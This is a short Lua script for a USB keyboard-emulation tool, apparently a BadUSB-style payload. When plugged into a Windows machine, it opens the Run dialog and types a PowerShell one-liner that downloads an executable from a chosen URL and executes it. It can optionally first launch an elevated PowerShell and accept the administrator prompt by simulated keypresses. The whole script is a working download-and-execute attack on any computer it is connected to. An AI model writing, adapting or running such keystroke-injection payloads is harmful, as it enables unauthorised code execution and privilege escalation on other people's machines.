---
--- downloadrun.lua: downloads and executes a file
--- directly translated from the Java version in previous builds
---

require('common')

local kb = luausb.create({ type = "keyboard" }) --[[@as KeyboardDev]]

local file = prompt {
  message = "Enter the URL for the file to download.",
  hint = "File URL",
  default = "https://github.com/Netdex/FlyingCursors/releases/download/1.0.0/FlyingCursors.exe"
}
local runAs = confirm {
  message = "Launch executable with administrator privileges?"
}

while true do
  print("idle")

  -- poll until usb plugged in
  wait_for_state("configured")
  wait_for_detect(kb)
  print("running")

  print("opening powershell, runAs=" .. tostring(runAs))
  if runAs then
    -- when running elevated prompt sometimes it pops in background, so we need
    -- to go to the desktop
    kb:chord(Keyboard.Mod.LSUPER, Keyboard.Key.D)
    wait(500)
    kb:chord(Keyboard.Mod.LSUPER, Keyboard.Key.R)
    wait(2000)
    kb:string("powershell Start-Process powershell -Verb runAs\n")
    wait(3000)
    kb:chord(Keyboard.Mod.LALT, Keyboard.Key.Y)
    wait(2000)
  else
    kb:chord(Keyboard.Mod.LSUPER, Keyboard.Key.R)
    wait(2000)
    kb:string("powershell\n")
    wait(2000)
  end

  print("download + execute code")

  kb:string(
    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
    "$u='" .. file .. "';" ..
    "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
    "$e=New-Object -com shell.application;" ..
    "$e.shellexecute($f);" ..
    "exit;\n"
  )

  print("done")
  wait_for_state("not-attached")

  print("disconnected")
end
